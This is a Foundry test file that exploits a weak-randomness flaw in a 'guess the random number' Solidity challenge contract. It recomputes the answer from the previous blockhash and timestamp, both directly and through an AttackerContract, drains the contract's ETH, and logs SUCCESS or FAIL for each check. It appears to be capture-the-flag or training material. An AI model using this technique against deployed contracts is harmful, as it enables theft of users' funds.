// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/guess_the_random_number.sol";

contract GuessTheRandomNumberExploit is Test {
    GuessTheRandomNumberChallenge public challenge;
    address public attacker = address(0x1337);

    function setUp() public {
        vm.deal(attacker, 1 ether); // Attacker only needs 1 ETH to play
        vm.deal(address(this), 1 ether);
        
        // Deploy the challenge contract with 1 ETH
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function testExploitRandomness() public {
        uint256 initialBalance = attacker.balance;
        vm.startPrank(attacker);

        console.log("--- BEFORE-Trigger State ---");
        uint256 challengeBalanceBefore = address(challenge).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 totalGamesBefore = challenge.totalGames();
        uint256 totalWinsBefore = challenge.totalWins();
        uint256 playerWinsBefore = challenge.playerWins(attacker);
        
        console.log("Challenge contract balance:", challengeBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Total games:", totalGamesBefore);
        console.log("Total wins:", totalWinsBefore);
        console.log("Attacker wins:", playerWinsBefore);

        console.log("--- Trigger Action (direct guess) ---");
        // Calculate the answer using the same method as the contract
        uint8 calculatedAnswer = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        ))));

        // Make a guess with the calculated answer
        challenge.guess{value: 1 ether}(calculatedAnswer);

        console.log("--- AFTER-Trigger State ---");
        uint256 challengeBalanceAfter = address(challenge).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 totalGamesAfter = challenge.totalGames();
        uint256 totalWinsAfter = challenge.totalWins();
        uint256 playerWinsAfter = challenge.playerWins(attacker);
        
        console.log("Challenge contract balance:", challengeBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("Total games:", totalGamesAfter);
        console.log("Total wins:", totalWinsAfter);
        console.log("Attacker wins:", playerWinsAfter);

        // Differential evaluations
        console.log("--- Differential Analysis ---");
        console.log("Contract balance changed (1 ETH -> 0):", 
            (challengeBalanceBefore == 1 ether) && (challengeBalanceAfter == 0) 
            ? "SUCCESS" : "FAIL");
        
        console.log("Attacker gained 1 ETH:", 
            (attackerBalanceAfter == attackerBalanceBefore + 1 ether) 
            ? "SUCCESS" : "FAIL");
            
        console.log("Game counted:", 
            (totalGamesAfter == totalGamesBefore + 1) 
            ? "SUCCESS" : "FAIL");
            
        console.log("Win recorded:", 
            (totalWinsAfter == totalWinsBefore + 1) 
            ? "SUCCESS" : "FAIL");
            
        console.log("Attacker win counted:", 
            (playerWinsAfter == playerWinsBefore + 1) 
            ? "SUCCESS" : "FAIL");

        // Final vulnerability verdict
        bool exploitSuccess = (challengeBalanceAfter == 0) &&
            (attackerBalanceAfter == attackerBalanceBefore + 1 ether) &&
            (totalGamesAfter == totalGamesBefore + 1) &&
            (totalWinsAfter == totalWinsBefore + 1) &&
            (playerWinsAfter == playerWinsBefore + 1) &&
            challenge.isComplete();
        
        if(exploitSuccess) {
            console.log("Vulnerability Exists: All differential signals show successful exploitation");
        } else {
            console.log("Vulnerability not Exist: State changes do not match exploit pattern");
        }

        // Verify the attack was successful (existing assertions maintained)
        assertTrue(challenge.isComplete(), "Challenge should be completed");
        assertEq(attacker.balance, initialBalance + 1 ether, "Attacker should have gained 1 ETH");

        vm.stopPrank();
    }

    function testExploitViaContract() public {
        vm.startPrank(attacker);

        console.log("--- BEFORE-Trigger State (contract) ---");
        uint256 challengeBalanceBefore = address(challenge).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 totalGamesBefore = challenge.totalGames();
        uint256 totalWinsBefore = challenge.totalWins();
        
        console.log("Challenge contract balance:", challengeBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Total games:", totalGamesBefore);
        console.log("Total wins:", totalWinsBefore);

        console.log("--- Trigger Action (contract deployment) ---");
        // Deploy attacker contract that calculates and guesses in same transaction
        AttackerContract attackerContract = new AttackerContract(address(challenge));
        
        // Record player wins BEFORE (using contract address)
        uint256 contractWinsBefore = challenge.playerWins(address(attackerContract));
        console.log("Attacker contract wins (before):", contractWinsBefore);

        console.log("--- Trigger Action (contract attack) ---");
        attackerContract.attack{value: 1 ether}();

        console.log("--- AFTER-Trigger State (contract) ---");
        uint256 challengeBalanceAfter = address(challenge).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 totalGamesAfter = challenge.totalGames();
        uint256 totalWinsAfter = challenge.totalWins();
        uint256 contractBalanceAfter = address(attackerContract).balance;
        uint256 contractWinsAfter = challenge.playerWins(address(attackerContract));
        
        console.log("Challenge contract balance:", challengeBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("Attacker contract ETH balance:", contractBalanceAfter);
        console.log("Total games:", totalGamesAfter);
        console.log("Total wins:", totalWinsAfter);
        console.log("Attacker contract wins (after):", contractWinsAfter);

        // Differential evaluations
        console.log("--- Differential Analysis (contract) ---");
        console.log("Contract balance drained:", 
            (challengeBalanceAfter == 0) 
            ? "SUCCESS" : "FAIL");
            
        console.log("Attacker gained via contract:", 
            (contractBalanceAfter >= 2 ether) 
            ? "SUCCESS" : "FAIL");
            
        console.log("Game counted:", 
            (totalGamesAfter == totalGamesBefore + 1) 
            ? "SUCCESS" : "FAIL");
            
        console.log("Win recorded:", 
            (totalWinsAfter == totalWinsBefore + 1) 
            ? "SUCCESS" : "FAIL");
            
        console.log("Contract win counted:", 
            (contractWinsAfter == contractWinsBefore + 1) 
            ? "SUCCESS" : "FAIL");

        // Final vulnerability verdict
        bool exploitSuccess = (challengeBalanceAfter == 0) &&
            (contractBalanceAfter >= 2 ether) &&
            (totalGamesAfter == totalGamesBefore + 1) &&
            (totalWinsAfter == totalWinsBefore + 1) &&
            (contractWinsAfter == contractWinsBefore + 1) &&
            challenge.isComplete();
        
        if(exploitSuccess) {
            console.log("Vulnerability Exists: Contract attack shows successful exploit patterns");
        } else {
            console.log("Vulnerability not Exist: Contract state changes don't match exploit pattern");
        }

        // Verify the attack was successful (existing assertions maintained)
        assertTrue(challenge.isComplete(), "Challenge should be completed");
        assertGt(address(attackerContract).balance, 1 ether, "Attacker contract should have won");

        vm.stopPrank();
    }
}

contract AttackerContract {
    GuessTheRandomNumberChallenge public challenge;

    constructor(address _challenge) {
        challenge = GuessTheRandomNumberChallenge(_challenge);
    }

    function attack() external payable {
        // Calculate the answer using the same method as the contract
        uint8 calculatedAnswer = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        ))));

        // Make a guess with the calculated answer
        challenge.guess{value: 1 ether}(calculatedAnswer);
    }

    receive() external payable {}
}